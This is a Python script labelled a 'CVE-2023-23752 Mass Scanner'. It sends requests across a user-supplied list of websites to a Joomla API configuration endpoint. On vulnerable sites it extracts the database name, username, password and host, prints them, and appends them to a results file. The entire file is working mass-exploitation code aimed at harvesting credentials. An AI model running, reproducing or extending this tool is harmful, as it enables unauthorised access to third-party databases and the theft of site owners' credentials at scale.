import requests, os, re
from multiprocessing.dummy import Pool
from colorama import Fore

class Website:
    def __init__(self, url):
        self.url = url

    def Exploit(self):
        try:
            agent = {'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'}
            r = requests.get(self.url+'/api/index.php/v1/config/application?public=true', headers=agent)
            if "dbtype" in r.text:
                print(f'{self.url} {Fore.GREEN} Vuln {Fore.WHITE}')
                db = re.search(r'"db":"([^"]+)"', r.text)
                user = re.search(r'"user":"([^"]+)"', r.text)
                password = re.search(r'"password":"([^"]+)"', r.text)
                host = re.search(r'"host":"([^"]+)"', r.text)
                print(f"DB: {db.group(1)}\nUSER: {user.group(1)}\nPASS: {password.group(1)}\nHOST: {host.group(1)}\n")
                saveres = open("result.txt", "a")
                saveres.write(f"Url: {self.url+'/api/index.php/v1/config/application?public=true'}\nDB: {db.group(1)}\nUSER: {user.group(1)}\nPASS: {password.group(1)}\nHOST: {host.group(1)}\n\n")
            else:
                print(f'{self.url} [{Fore.RED}{r.status_code}{Fore.WHITE}]')
        except:
            pass

def asuna(list):
    global website
    website = Website(list)
    website.Exploit()

def main():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

    print("""
        CVE-2023-23752 Mass Scanner
    """)

    try:
        urList = open(input("weblist: "), "r").read().split("\n")
        thread = int(input("thread: "))
        print("\n")
        pool = Pool(thread)
        pool.map(asuna, urList)
        pool.close()
        pool.join
    except:
        print("        [!] Something wrong please try again...")

if __name__ == '__main__':
    main()
